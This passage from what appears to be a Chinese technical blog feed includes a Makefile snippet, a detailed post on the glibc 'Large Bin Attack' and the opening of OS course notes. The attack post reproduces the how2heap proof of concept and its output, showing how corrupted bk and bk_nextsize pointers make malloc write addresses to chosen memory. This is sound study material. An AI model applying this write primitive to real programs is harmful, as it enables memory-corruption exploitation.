$(src))</span><br></pre></td></tr></table></figure><p><strong>subst</strong></p><p>subst 函数用来文本替换，格式如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(subst from,to,text)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$(subst ee,EE,feet on the street)</span><br><span class="line">将字符串&quot;feet on the street&quot;替换成&quot;fEEt on the strEEt&quot;。</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello/</span><br><span class="line">├──main.c</span><br><span class="line">├──factorial.c</span><br><span class="line">├──printhello.c</span><br><span class="line">└──functions.h</span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">TARGET = hello</span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">wildcard</span> ./*.c)</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> ./%.c,./%.o,<span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">GCCFLAGS= -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">    <span class="variable">$(CC)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.c</span></span><br><span class="line">    <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line">clean :</span><br><span class="line">    rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large Bin Attack</title>
      <link href="/2023/03/24/Large-bin-attack/"/>
      <url>/2023/03/24/Large-bin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p>在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中，32位程序大于504(0x1f8)进入largebin，64位程序大于1008(0x3f0)进入largebin，否则合适的话进入smallbin</p><p>largebin比unsortedbin多了<code> struct malloc_chunk* fd_nextsize;</code>指向比当前小的chunk<code> struct malloc_chunk* bk_nextsize;</code>指向比当前大的chunk</p><h2 id="Large-Bin的插入顺序"><a href="#Large-Bin的插入顺序" class="headerlink" title="Large Bin的插入顺序"></a>Large Bin的插入顺序</h2><ol><li>按照大小，从大到小排序,largebin链接最小的chunk</li><li>如果大小相同，按照free的时间排序</li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ol><h2 id="2-23malloc-c源码-remove-from-unsorted-list"><a href="#2-23malloc-c源码-remove-from-unsorted-list" class="headerlink" title="2.23malloc.c源码 remove from unsorted list"></a>2.23malloc.c源码 remove from unsorted list</h2><p>victim是我们要从unsortedbin分类的chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size)) <span class="comment">//判断size是不是属于smallbin</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;<span class="comment">//bck的fd存放最大chunk，bk存放最小chunk</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//这里开始就是放入largebin</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)<span class="comment">//如果相等证明他是这个组里面第一个，不相等说明largebin里有其他的chunk了需要进行比较，维持大小顺序</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)<span class="comment">//找一个比当前victim-&gt;size要&gt;=的地方链接链接进去</span></span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)<span class="comment">//如果等于</span></span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">// victim-&gt;size &gt; fwd-&gt;size</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><h2 id="How2heap-large-bin-attack"><a href="#How2heap-large-bin-attack" class="headerlink" title="How2heap large_bin_attack"></a>How2heap large_bin_attack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc large_bin_attack.c -o large_bin_attack -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">                    <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">                    <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">                    <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">                    <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">                    <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">                    <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">                    <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/ctext&gt; ./large_bin_attack</span><br><span class="line">This file demonstrates large bin attack by writing a large <span class="type">unsigned</span> <span class="type">long</span> value into <span class="built_in">stack</span></span><br><span class="line">In practice, large bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="number">&#x27;</span>s first look at the targets we want to rewrite on <span class="built_in">stack</span>:</span><br><span class="line">stack_var1 (<span class="number">0x7fffffffdca8</span>): <span class="number">0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffffffdcb0</span>): <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Now, we allocate the first large chunk on the heap at: <span class="number">0x603000</span></span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Then, we allocate the second large chunk on the heap at: 0x603360</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Finally, we allocate the third large chunk on the heap at: 0x6037a0</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">We <span class="built_in">free</span> the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x603360 &lt;--&gt; 0x603000 ]</span><br><span class="line"></span><br><span class="line">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk <span class="keyword">for</span> allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now, we <span class="built_in">free</span> the third large chunk and it will be inserted in the unsorted bin: [ 0x6037a0 &lt;--&gt; 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force <span class="built_in">malloc</span> to insert the freed third large chunk at the head of the large bin freelist. To overwrite the <span class="built_in">stack</span> variables, we <span class="built_in">set</span> &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let&#x27;s <span class="built_in">malloc</span> again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span><br><span class="line"><span class="title function_">stack_var1</span> <span class="params">(<span class="number">0x7fffffffdca8</span>)</span>: 0x6037a0</span><br><span class="line"><span class="title function_">stack_var2</span> <span class="params">(<span class="number">0x7fffffffdcb0</span>)</span>: 0x6037a0</span><br></pre></td></tr></table></figure><h3 id="先申请了三个chunk和一些小chunk防止topchunk合并，释放掉前两个chunk"><a href="#先申请了三个chunk和一些小chunk防止topchunk合并，释放掉前两个chunk" class="headerlink" title="先申请了三个chunk和一些小chunk防止topchunk合并，释放掉前两个chunk"></a>先申请了三个chunk和一些小chunk防止topchunk合并，释放掉前两个chunk</h3><p><img src="/2023/03/24/Large-bin-attack/image-20230323235004320.png" alt="image-20230323235004320"></p><h3 id="void-p4-x3D-malloc-0x90"><a href="#void-p4-x3D-malloc-0x90" class="headerlink" title="void* p4 &#x3D; malloc(0x90);"></a>void* p4 &#x3D; malloc(0x90);</h3><p>这一步执行时，所有bin没有合适大小的chunk，会发生上面源码里的合并</p><ul><li>从unsorted bin中拿出最后一个p1放入small bin</li><li>从unsorted bin中拿出最后一个p2放入large bin</li><li>从smallbin里分割chunk p1给p4，把剩余部分再次放入unsortedbin</li></ul><p><img src="/2023/03/24/Large-bin-attack/image-20230323235716579.png" alt="image-20230323235716579"></p><h3 id="free-p3"><a href="#free-p3" class="headerlink" title="free(p3)"></a>free(p3)</h3><p>进入unsortedbin</p><p><img src="/2023/03/24/Large-bin-attack/image-20230324000149331.png" alt="image-20230324000149331"></p><h3 id="模拟漏洞"><a href="#模拟漏洞" class="headerlink" title="模拟漏洞"></a>模拟漏洞</h3><p>修改后</p><p><img src="/2023/03/24/Large-bin-attack/image-20230324000347943.png" alt="image-20230324000347943"></p><p>p2-&gt;size&#x3D;0x3f1</p><p>p2-&gt;bk&#x3D;stack_var1_addr - 0x10</p><p>p2-&gt;bk_nextsize&#x3D;stack_var2_addr - 0x20</p><h3 id="malloc-0x90"><a href="#malloc-0x90" class="headerlink" title="!!malloc(0x90);!!"></a>!!malloc(0x90);!!</h3><p>这个时候我们还是会触发上面源码</p><ul><li>从unsorted bin中拿出最后一个切割p1放入small bin</li><li>从unsorted bin中拿出最后一个p3放入large bin</li><li>从smallbin里分割分割过的p1给malloc，把剩余部分再次放入unsortedbin</li></ul><p>从unsorted bin中拿出最后一个p3放入large bin这个过程就是我们的利用过程</p><p>我们把p2-&gt;size&#x3D;0x3f1可以绕过<code> while ((unsigned long) size &lt; fwd-&gt;size)</code>，来到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p><strong>此时victim为p3，fwd为p2</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P3-&gt;fd_nextsize = P2</span><br><span class="line"></span><br><span class="line">P3-&gt;bk_nextsize = P2-&gt;bk_nextsize=stack_var2_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">P2-&gt;bk_nextsize =P3</span><br><span class="line"></span><br><span class="line">P3-&gt;bk_nextsize-&gt;fd_nextsize = *（stack_var2_addr<span class="number">-0x20</span>+<span class="number">0x20</span>)= *（stack_var2_addr）=P3</span><br></pre></td></tr></table></figure><p>来到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck=p2-&gt;bk</span><br><span class="line"></span><br><span class="line">p3-&gt;bk=p2-&gt;bk</span><br><span class="line"></span><br><span class="line">p3-&gt;fd=p2</span><br><span class="line"></span><br><span class="line">p2-&gt;bk=p3</span><br><span class="line"></span><br><span class="line">p2-&gt;bk-&gt;fd=*(stack_var1_addr - <span class="number">0x10</span>+<span class="number">0x10</span>)=*(stack_var1_addr）=P3</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果我们可以在largebin构造bk和bk_nextsize构造tar1-0x10,tar2-0x20，可以在malloc将unsortedbin里的chunk(这个chunk要比largebin里面的chunk大)写入largebin时在tar1和tar2写入这个chunk的地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> Large Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:操作系统上的程序</title>
      <link href="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/slides/2.slides#/">http://jyywiki.cn/OS/2022/slides/2.slides#/</a></p><h1 id="操作系统上的程序"><a href="#操作系统上的程序" class="headerlink" title="操作系统上的程序"></a>操作系统上的程序</h1><h2 id="数字电路与状态机"><a href="#数字电路与状态机" class="headerlink" title="数字电路与状态机"></a>数字电路与状态机</h2><h3 id="数字逻辑电路：模拟器"><a href="#数字逻辑电路：模拟器" class="headerlink" title="数字逻辑电路：模拟器"></a>数字逻辑电路：模拟器</h3><p>“¬”、“∧”、“∨”非与或</p><p><em>X</em>′&#x3D;¬<em>X</em>∧<em>Y</em></p><p><em>Y</em>′&#x3D;¬<em>X</em>∧¬<em>Y</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REGS_FOREACH(_)  _(X) _(Y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUN_LOGIC        X1 = !X &amp;&amp; Y; \    <span class="comment">//用于多行宏</span></span></span><br><span class="line">                         Y1 = !X &amp;&amp; !Y;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE(X)        static int X, X##1; <span class="comment">//两个##是连接符，即把两个宏变量拼接到一起</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UPDATE(X)        X = X##1;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINT(X)         printf(#X <span class="string">&quot; = %d; &quot;</span>, X); <span class="comment">//#的作用就是把后面的参数当做一个字符串，也就是说等同于把后面的宏变量加上双引号</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  REGS_FOREACH(DEFINE)</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// clock</span></span><br><span class="line">    RUN_LOGIC</span><br><span class="line">    <span class="title function_">REGS_FOREACH</span><span class="params">(PRINT)</span></span><br><span class="line">    <span class="title function_">REGS_FOREACH</span><span class="params">(UPDATE)</span></span><br><span class="line">    <span class="title function_">putchar</span><span class="params">(<span class="string">&#x27;\n&#x27;</span>)</span>; sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;   </span><br><span class="line">可以用gcc -E 看下预处理结果</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> X, X1; <span class="type">static</span> <span class="type">int</span> Y, Y1;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    X1 = !X &amp;&amp; Y; Y1 = !X &amp;&amp; !Y;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;X&quot;</span> <span class="string">&quot; = %d; &quot;</span>, X); <span class="built_in">printf</span>(<span class="string">&quot;Y&quot;</span> <span class="string">&quot; = %d; &quot;</span>, Y);</span><br><span class="line">    X = X1; Y = Y1;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>); sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">grxer@grxer ~/D/s/N/p2&gt; ./simulator </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">1</span>; </span><br><span class="line">X = <span class="number">1</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span 